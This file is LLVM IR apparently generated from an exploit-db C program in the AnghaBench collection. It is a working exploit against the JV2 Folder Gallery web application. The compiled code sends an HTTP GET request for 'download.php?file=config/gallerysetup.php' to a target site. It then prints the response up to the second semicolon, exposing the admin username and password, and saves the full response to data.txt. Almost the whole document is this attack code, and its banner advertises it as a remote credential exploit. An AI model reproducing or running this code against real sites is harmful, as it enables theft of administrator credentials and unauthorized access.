; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_3125.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_3125.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [705 x i8] c"\09**************************************************************\0A\09*                                                            *\0A\09*                   JV2 Folder Gallery                       *\0A\09*        Remote Admin uName and Pass. Exploit by PeTrO       *\0A\09*                                                            *\0A\09*    Usage:exploit targetSite [GalleryPath]                  *\0A\09*    Example:exploit localhost /gallery/                     *\0A\09*                                                            *\0A\09*    Discovered by    :SaO                                   *\0A\09*    Exploit Coded by :PeTrO                                 *\0A\09**************************************************************\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.2 = private unnamed_addr constant [45 x i8] c"download.php?file=config/gallerysetup.php \0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"\0A[+]Connecting....\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [17 x i8] c"\0A[-]Socket Error\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"\0A[-]Connecting Error\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"\0A[+]Sending command\0A\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"\0A[-]Sending Error\00", align 1
@.str.8 = private unnamed_addr constant [18 x i8] c"\0A[-]Receive Error\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"data.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1000 x i8], align 16
  %7 = alloca [1000 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %15 = call i32 @MAKEWORD(i32 2, i32 0)
  %16 = call i32 @WSAStartup(i32 %15, i32* %10)
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 3
  br i1 %18, label %19, label %22

19:                                               ; preds = %2
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([705 x i8], [705 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 @exit(i32 1) #4
  unreachable

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call %struct.hostent* @gethostbyname(i8* %25)
  store %struct.hostent* %26, %struct.hostent** %12, align 8
  br label %27

27:                                               ; preds = %22
  %28 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %29 = call i32 @strcpy(i8* %28, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %30 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcat(i8* %30, i8* %33)
  %35 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %36 = call i32 @strcat(i8* %35, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  %38 = load i32, i32* @AF_INET, align 4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  store i32 %38, i32* %39, align 4
  %40 = call i32 @htons(i32 80)
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  store i32 %40, i32* %41, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  %43 = load %struct.hostent*, %struct.hostent** %12, align 8
  %44 = getelementptr inbounds %struct.hostent, %struct.hostent* %43, i32 0, i32 0
  %45 = load i64, i64* %44, align 8
  %46 = inttoptr i64 %45 to %struct.in_addr*
  %47 = bitcast %struct.in_addr* %42 to i8*
  %48 = bitcast %struct.in_addr* %46 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %47, i8* align 4 %48, i64 4, i1 false)
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  %50 = call i32 @memset(i32* %49, i8 signext 0, i32 8)
  %51 = load i32, i32* @AF_INET, align 4
  %52 = load i32, i32* @SOCK_STREAM, align 4
  %53 = call i32 @socket(i32 %51, i32 %52, i32 0)
  store i32 %53, i32* %11, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %58

55:                                               ; preds = %27
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %57 = call i32 @exit(i32 -1) #4
  unreachable

58:                                               ; preds = %27
  %59 = load i32, i32* %11, align 4
  %60 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %61 = call i32 @connect(i32 %59, %struct.sockaddr* %60, i32 4)
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %66

63:                                               ; preds = %58
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0))
  %65 = call i32 @exit(i32 -1) #4
  unreachable

66:                                               ; preds = %58
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  %68 = load i32, i32* %11, align 4
  %69 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %70 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %71 = call i32 @strlen(i8* %70)
  %72 = call i32 @send(i32 %68, i8* %69, i32 %71, i32 0)
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %77

74:                                               ; preds = %66
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0))
  %76 = call i32 @exit(i32 -1) #4
  unreachable

77:                                               ; preds = %66
  %78 = load i32, i32* %11, align 4
  %79 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %80 = call i32 @recv(i32 %78, i8* %79, i32 1000, i32 0)
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %85

82:                                               ; preds = %77
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0))
  %84 = call i32 @exit(i32 -1) #4
  unreachable

85:                                               ; preds = %77
  %86 = call i32* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  store i32* %86, i32** %14, align 8
  store i32 0, i32* %8, align 4
  br label %87

87:                                               ; preds = %107, %85
  %88 = load i32, i32* %9, align 4
  %89 = icmp ne i32 %88, 2
  br i1 %89, label %90, label %110

90:                                               ; preds = %87
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 %92
  %94 = load i8, i8* %93, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp eq i32 %95, 59
  br i1 %96, label %97, label %100

97:                                               ; preds = %90
  %98 = load i32, i32* %9, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %9, align 4
  br label %100

100:                                              ; preds = %97, %90
  %101 = load i32, i32* %8, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = sext i8 %104 to i32
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i32 %105)
  br label %107

107:                                              ; preds = %100
  %108 = load i32, i32* %8, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %8, align 4
  br label %87

110:                                              ; preds = %87
  %111 = load i32*, i32** %14, align 8
  %112 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %113 = call i32 @fprintf(i32* %111, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %112)
  %114 = call i32 (...) @WSACleanup()
  ret i32 0
}

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
